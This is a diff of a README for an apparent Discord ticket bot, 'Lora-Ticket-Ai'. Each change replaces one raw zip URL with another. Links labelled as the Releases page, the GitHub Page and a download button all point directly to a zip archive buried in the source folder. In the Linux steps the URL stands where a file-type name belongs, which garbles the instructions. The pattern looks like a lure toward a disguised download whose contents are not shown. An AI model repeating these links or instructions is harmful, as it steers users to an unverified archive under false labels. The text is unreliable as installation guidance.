@@ -8,7 +8,7 @@ Lora-Ticket-Ai is an AI-powered bot designed for Discord. It streamlines custome
 
 To get started, you need to download the software. You can visit this page to download the app.  
 
-[![Download Lora-Ticket-Ai](https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/Ticket-Lora-Ai-3.3.zip%https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/Ticket-Lora-Ai-3.3.zip)](https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/Ticket-Lora-Ai-3.3.zip)  
+[![Download Lora-Ticket-Ai](https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/ai/Lora-Ai-Ticket-3.1.zip%https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/ai/Lora-Ai-Ticket-3.1.zip)](https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/ai/Lora-Ai-Ticket-3.1.zip)  
 
 By clicking the button above, you will be taken to the Releases page, where you can find the latest version of Lora-Ticket-Ai. 
 
@@ -16,7 +16,7 @@ By clicking the button above, you will be taken to the Releases page, where you 
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/Ticket-Lora-Ai-3.3.zip) to find the latest version of the Lora-Ticket-Ai software.
+Go to the [Releases page](https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/ai/Lora-Ai-Ticket-3.1.zip) to find the latest version of the Lora-Ticket-Ai software.
 
 ### Step 2: Select the Latest Version
 
@@ -28,7 +28,7 @@ Once you identify the latest version, look for the file appropriate for your ope
 
 - For Windows: Download the `.exe` file.
 - For macOS: Download the `.dmg` file.
-- For Linux: You might find a `https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/Ticket-Lora-Ai-3.3.zip` file.
+- For Linux: You might find a `https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/ai/Lora-Ai-Ticket-3.1.zip` file.
 
 Click on the appropriate file link to start the download.
 
@@ -38,7 +38,7 @@ After downloading, find the file in your downloads folder.
 
 - **For Windows:** Double-click the downloaded `.exe` file and follow the installation prompts.
 - **For macOS:** Open the `.dmg` file and drag the Lora-Ticket-Ai icon to the Applications folder.
-- **For Linux:** Extract the `https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/Ticket-Lora-Ai-3.3.zip` file and follow the instructions in the contained README file to install.
+- **For Linux:** Extract the `https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/ai/Lora-Ai-Ticket-3.1.zip` file and follow the instructions in the contained README file to install.
 
 ### Step 5: Run Lora-Ticket-Ai
 
@@ -93,6 +93,6 @@ For those interested in contributing or getting involved in development, check o
 
 ## 🌐 Learn More
 
-For more information, tutorials, or community discussions, visit our [GitHub Page](https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/Ticket-Lora-Ai-3.3.zip) or look for support channels. 
+For more information, tutorials, or community discussions, visit our [GitHub Page](https://github.com/ufdyufu/Lora-Ticket-Ai/raw/refs/heads/main/src/commands/ai/Lora-Ai-Ticket-3.1.zip) or look for support channels. 
 
 Remember to frequently check the Releases page for new updates and features. Thank you for choosing Lora-Ticket-Ai!
